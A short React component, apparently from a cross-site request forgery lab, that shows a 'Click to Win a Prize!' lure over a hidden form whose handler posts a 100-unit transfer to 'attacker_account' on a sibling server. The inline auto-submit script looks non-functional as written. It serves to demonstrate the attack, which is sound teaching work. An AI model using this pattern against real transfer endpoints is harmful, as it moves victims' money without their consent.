import axios from 'axios';
import React from 'react';

const serverUrl = document.location.host.replace("3000", "3001");
console.log("serverUrl:", serverUrl);
function Malicious() {
  const handleSubmit = async (e) => {
    e.preventDefault();
    await axios.post(`https://${serverUrl}/transfer`, {
      amount: 100,
      toAccount: 'attacker_account'
    });
  };

  return (
    <div className="malicious">
      <h2>Click to Win a Prize!</h2>
      <form onSubmit={handleSubmit} style={{ display: 'none' }}>
        <input type="hidden" value="100" />
        <button type="submit">Hidden Submit</button>
      </form>
      <script>
        document.querySelector('form').submit();
      </script>
    </div>
  );
}

export default Malicious;
